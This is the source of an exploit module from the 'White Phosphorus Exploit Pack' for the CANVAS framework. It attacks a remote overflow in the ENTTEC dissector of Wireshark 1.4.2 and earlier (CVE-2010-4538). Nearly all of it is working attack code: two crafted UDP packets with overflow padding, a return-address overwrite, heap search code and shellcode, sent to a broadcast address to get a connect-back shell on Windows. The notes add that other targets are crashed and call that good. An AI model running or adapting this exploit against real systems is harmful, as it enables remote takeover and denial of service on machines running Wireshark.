
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
if "." not in sys.path: sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import socket
import sys
import struct
from struct import *

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from encoder import addencoder
from shellcode import shellcodeGenerator
from linuxNode import linuxNode
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
import time
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Wireshark <= 1.4.2 ENTTEC Dissector Remote Overflow"
DESCRIPTION = "Exploits an issue in the ENTTEC Dissector versions <=1.4.2"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2010-12-31"
DOCUMENTATION["Repeatability"] = "One Time"   
DOCUMENTATION['VersionsAffected']='Wireshark <=1.4.2'
DOCUMENTATION['CVE'] = "2010-4538"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2010-4538'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["References"] = """http://www.wireshark.org/security/wnpa-sec-2011-02.html
https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=5539"""
DOCUMENTATION['Notes'] = """
MUST BE RUN AGAINST A BROADCAST ADDRESS x.x.x.255

This will send back a shell on Windows against V 1.4.2, will DOS anything else which is still a good thing :)

"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP" ]

NOTES="""
MUST BE RUN AGAINST A BROADCAST ADDRESS x.x.x.255

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Wireshark <= 1.4.2 ENTTEC Dissector Remote Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Universal Non DEP/ASLR (1.4.x)

Payloads:
0: TCP Connect Back

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_wireshark_enttec/wp_wireshark_enttec.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 3333
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets,PORT)
    return

targets = {
    0 : ["Universal Non DEP/ASLR (1.4.x)", (0x00000000), []]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS = ["TCP Connect Back"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return
    
    def usage(self):
        self.wp_usage(targets)
        return

    #def test(self):
	
     #   return True

    def neededListenerTypes(self):
        self.getArgs()    
	
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targetting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()   

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        
        if self.host.endswith("255"):
            self.log("WP> Sending stage 1 to target: %s:%d"%(self.host,self.port))
            data  = "ESDD\x10\x20\x04"
            data += "\x02\x00"   
            data += "\x02" * 2000
            sc ='c00kc00k' 
            sc += wp_AlignStack()
            sc += self.shellcode
            data += sc 
            data += "\x03" * 1000
            #MOSDEF UDP sockets don't have sendto()
            s = self.getudpsock()
            s.connect((self.host, self.port))
            s.send(data)
            s.close()
            #s.sendto(data, (self.host, self.port))
            
            self.log("WP> Sending stage 2 to target: %s:%d"%(self.host,self.port))
            data  = "ESDD\x10\x20\x04"
            data += "\x02\x00"    # size
            data += "\xfe\xff\x44" *34
            data += "\xfe\x8a\x44"
            data += "\xfc\xfd\xfe\x3c\x02"  #eip
            data += "\x90\x90\x90\x90"  
            data += "\xeb\x72"  # jmp foward to searchcode
            data += "\x44" * 106 #spacer
            
            data += "\xe0\xfd\xfe\x3c\x02"  #address
            data += "\x01\x02\x03\x04"  
            searchcode = wp_SearchCodeHeap(False);
            data += searchcode
            data += "\x01" * (200 - len(searchcode))  #spacer
            data += "\xfd\xff"
            #s.sendto(data, (self.host, self.port))
            s = self.getudpsock()
            s.connect((self.host, self.port))
            s.send(data)
            s.close()
            
            s.close()
            self.log("WP> Exploit sent")
        else:
            self.log("WP> Exploit must be run against a broadcast address")
            self.setInfo("WP> %s attacking %s:%d - completed (failed?)"%(NAME,self.host,self.port))
            return 0        

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret
    
if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
